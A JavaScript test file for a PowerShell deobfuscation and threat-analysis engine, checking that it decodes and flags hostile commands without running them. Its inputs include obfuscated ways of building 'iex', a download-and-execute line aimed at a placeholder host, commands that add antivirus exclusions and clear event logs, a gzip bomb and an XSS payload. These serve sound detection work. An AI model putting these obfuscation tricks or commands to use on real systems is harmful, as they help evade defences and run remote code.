import { test } from "node:test";
import assert from "node:assert/strict";
import { gzipSync, deflateRawSync, deflateSync } from "node:zlib";
import { analyze, LIMITS } from "../src/powershell-engine.js";
import { foldLiterals } from "../src/powershell-literals.js";
import { foldVariables } from "../src/powershell-variables.js";
for (const [name, input, expected] of [
  [
    "nested format",
    "(('Inv'+'oke-{0}') -f ('Ex'+'pression'))",
    "'Invoke-Expression'",
  ],
  ["negative range reversal", "('xei'[-1..-3] -join '')", "'iex'"],
  ["arbitrary index order", "('xie'[1,2,0] -join '')", "'iex'"],
  ["negative index list", "('xei'[-1,-2,-3] -join '')", "'iex'"],
  ["unary join", "(-join ('i','e','x'))", "'iex'"],
  ["character array", "([char[]](105,101,120) -join '')", "'iex'"],
  ["nested char cast", "([char](64+1))", "'A'"],
  ["constant XOR", "([char](107 -bxor 2))", "'i'"],
  ["string replacement", "('I#E#X'.Replace('#',''))", "'IEX'"],
  ["substring", "('xxiexyy'.Substring(2,3))", "'iex'"],
  ["case conversion", "('IEX'.ToLower())", "'iex'"],
  ["char array method", "('xei'.ToCharArray()[-1..-3] -join '')", "'iex'"],
  ["format escaped braces", "('{{{0}}}' -f 'x')", "'{x}'"],
  ["multiple format arguments", "('{2}{0}{1}'-f 'e','x','i')", "'iex'"],
  ["empty join elements", "(('i','','e','x')-join '')", "'iex'"],
])
  test(`literal reader: ${name}`, () =>
    assert.equal(foldLiterals(input).text, expected));
test("environment-based invocation and pipeline joins are recognized without guessing values", async () => {
  const input =
    "&((gci Env:\\C*mS*).Value[4,11,25]-Join'') (('xei'[-1..-3]-join '') | & ('{1}{0}'-f 'e','r') {-join $_})";
  const r = await analyze(input);
  assert.match(r.summary, /indirectly/);
  for (const title of [
    "Environment-based name construction",
    "Uses pipeline-dependent values",
    "Evaluates code dynamically",
  ])
    assert.ok(
      r.findings.some((f) => f.title === title),
      title,
    );
  assert.ok(r.layers.some((l) => l.text.includes("'iex'")));
  assert.ok(r.layers.every((l) => l.text.includes("Env:\\C*mS*")));
});
test("literal reader leaves variables, arbitrary methods, scripts and regex operators unresolved", () => {
  for (const input of [
    "$env:ComSpec[4,15,25]",
    "('foo'.GetType())",
    "('x' -replace '(a+)+$','y')",
    "('a' + $unknown)",
    "('a' -join $_)",
    '"$name"',
    "# ('a'+'b')",
  ]) {
    assert.equal(foldLiterals(input).text, input);
  }
});
test("huge ranges and expensive formatting stay bounded", () => {
  for (const input of [
    "([char[]](0..999999999)-join '')",
    "('x'[0..999999999]-join '')",
    "('{999999999}' -f 'a')",
    "'" + "a".repeat(20000) + "'.Replace('a','" + "b".repeat(1000) + "')",
  ]) {
    assert.ok(foldLiterals(input).text.length <= input.length + 100);
  }
});
test("new behavior families expose evidence and keep uncertainty", async () => {
  for (const [input, title] of [
    ["Register-WmiEvent -Class __EventFilter", "WMI event subscription"],
    [
      "Set-MpPreference -ExclusionPath C:\\Temp",
      "Security exclusions or disabled scanning",
    ],
    ["UploadData($url,$data)", "Possible outbound data transfer"],
    ["Clear-EventLog System", "Event-log or history changes"],
    ["vssadmin list shadows", "Shadow-copy or recovery changes"],
    ["Get-Clipboard", "Clipboard access"],
    ["Get-CimInstance Win32_OperatingSystem", "System discovery"],
    ["gcm *-Expression", "Wildcard command discovery"],
  ]) {
    const r = await analyze(input);
    assert.ok(
      r.findings.some((f) => f.title === title && f.evidence.length > 0),
      title,
    );
    assert.ok(r.warnings.length > 0);
  }
});
test("UTF-16LE encoded command exposes download and evaluation evidence", async () => {
  const text = "iwr 'https://example.invalid/payload' | iex";
  const result = await analyze(
    "powershell -enc " + Buffer.from(text, "utf16le").toString("base64"),
  );
  assert.ok(result.layers.some((l) => l.text === text));
  assert.match(result.summary, /download-and-execute/);
  assert.deepEqual(result.indicators, ["https://example.invalid/payload"]);
});
test("nested Base64 is decoded without execution", async () => {
  const inner = "Write-Output 'hello'";
  const mid = `[Convert]::FromBase64String('${Buffer.from(inner).toString("base64")}')`;
  const result = await analyze(
    "powershell -EncodedCommand " +
      Buffer.from(mid, "utf16le").toString("base64"),
  );
  assert.ok(result.layers.some((l) => l.text === inner));
});
test("literal concatenation, char codes and format candidates", async () => {
  const result = await analyze(
    "('Invo' + 'ke-Expression'); [char]0x48 + [char]105; ('{1}{0}' -f ' Lab','Smithey')",
  );
  assert.ok(
    result.findings.some((f) => f.title === "Evaluates code dynamically"),
  );
  assert.ok(result.layers.some((l) => l.text.includes("'Hi'")));
  assert.ok(result.layers.some((l) => l.text.includes("'Smithey Lab'")));
});
test("gzip expansion is bounded", async () => {
  const good = gzipSync(Buffer.from("Write-Output 'hello'")).toString("base64");
  assert.ok(
    (await analyze(good)).layers.some((l) => l.text === "Write-Output 'hello'"),
  );
  const bomb = gzipSync(Buffer.alloc(1000000, 65)).toString("base64");
  const result = await analyze(bomb);
  assert.ok(result.warnings.some((w) => w.includes("Compressed")));
  assert.equal(result.layers.length, 0);
});
test("reject oversized and empty input, tolerate invalid Base64", async () => {
  await assert.rejects(analyze("a".repeat(LIMITS.input + 1)), /32 KiB/);
  await assert.rejects(analyze("😀".repeat(9000)), /32 KiB/);
  await assert.rejects(analyze(" "), /Paste/);
  assert.ok(
    (await analyze("powershell -enc A")).warnings.some((w) =>
      w.includes("Base64"),
    ),
  );
});
test("uncertainty remains explicit for unknown code and comment matches", async () => {
  const result = await analyze("# iex is mentioned in this comment");
  assert.ok(result.warnings.some((w) => w.includes("comments")));
  assert.match(
    (await analyze("$x = Some-UnknownFunction")).summary,
    /does not mean.*safe/,
  );
});
test("preserves data, does not execute JavaScript-looking payloads", async () => {
  globalThis.psTestMarker = 0;
  await analyze("globalThis.psTestMarker=42; <img src=x onerror=alert(1)>");
  assert.equal(globalThis.psTestMarker, 0);
  delete globalThis.psTestMarker;
});
test("candidate budget holds for repeated transforms", async () => {
  const result = await analyze(
    Array.from({ length: 100 }, () => "([char]73 + [char]69 + [char]88)").join(
      ";",
    ),
  );
  assert.ok(result.layers.length <= 24);
  assert.ok(
    result.layers.reduce((n, l) => n + l.text.length, 0) < LIMITS.output,
  );
});
test("exact user sample: expose construction and unresolved environment, recover re without inventing its meaning", async () => {
  const input = `&((gci Env:\\C*mS*).Value[4,11,25]-Join'')((((('S'+'{0}'+'s'+'{0}'+'f'+'{1}'+'l'+'!')-f'u','e'),'s','e','T',' ','l','o','o','T')|&("{1}{0}"-f'e','r'){-Join$_})[-1..-9]-Join'')`;
  const result = await analyze(input);
  assert.match(result.summary, /indirectly/);
  assert.ok(result.invoked.includes("re"));
  assert.ok(result.layers.some((l) => l.text.includes("Susufel!")));
  assert.ok(result.unresolved.some((x) => x.includes("Environment")));
  assert.ok(result.unresolved.some((x) => x.includes("Pipeline")));
  assert.ok(!result.invoked.includes("iex"));
  assert.ok(
    !result.findings.some((f) => f.title === "Evaluates code dynamically"),
  );
});
test("literal URI, explicit hex text and XOR pipeline decoders expose behavior", async () => {
  for (const command of [
    "& ([Uri]::UnescapeDataString('%69%65%78'))",
    "& ([Text.Encoding]::UTF8.GetString([Convert]::FromHexString('696578')))",
    "& (((107,103,122 | % {[char]($_ -bxor 2)}))-join '')",
  ]) {
    const result = await analyze(command);
    assert.ok(
      result.findings.some((f) => f.title === "Evaluates code dynamically"),
      command,
    );
  }
});
test("deflate raw and zlib wrappers are decoded within the same budget", async () => {
  for (const zip of [deflateRawSync, deflateSync]) {
    const b64 = zip(Buffer.from("iex 'example'")).toString("base64");
    const result = await analyze(
      `DeflateStream([Convert]::FromBase64String('${b64}'))`,
    );
    assert.ok(result.layers.some((l) => l.text === "iex 'example'"));
  }
});
test("UTF-16 gzip, literal encoding wrapper, and nested formats combine", async () => {
  const command = "& ('{1}{0}'-f 'ex','i')";
  const result = await analyze(
    gzipSync(Buffer.from(command, "utf16le")).toString("base64"),
  );
  assert.ok(result.invoked.includes("iex"));
});
test("straight-line literal variables reveal constructed invocation", async () => {
  const result = await analyze(
    "$a='Inv';$b=$a+'oke-Expression'; & $b 'example'",
  );
  assert.ok(result.invoked.includes("Invoke-Expression"));
});
test("variable pass does not invent values across commands, blocks, interpolation, or scoped names", () => {
  for (const input of [
    "$a='iex';Change-State; & $a",
    "if ($true) {$a='iex'}; & $a",
    "$a='iex'; & $env:a",
    "$a='iex';Write-Output \"$a\"",
    "$a='iex'; $b=Unknown-Command; & $b",
  ]) {
    const result = foldVariables(input, Date.now() + 1000);
    assert.equal(result.text, input);
  }
});
test("binary joins with unknown left operands retain their operator", () => {
  for (const input of [
    "$unknown -join ''",
    "(gci Env:\\C*mS*).Value[4,11,25]-Join''",
    "($unknown)[-1..-9]-join ''",
  ]) {
    assert.equal(foldLiterals(input).text, input);
  }
});
test("replacement updates and semicolons inside quoted strings remain literal", () => {
  assert.match(
    foldVariables("$x='iex';$x='Write-Output'; & $x", Date.now() + 1000).text,
    /& \('Write-Output'\)/,
  );
  assert.match(
    foldVariables("$x='a;b';Write-Output $x", Date.now() + 1000).text,
    /'a;b'/,
  );
});
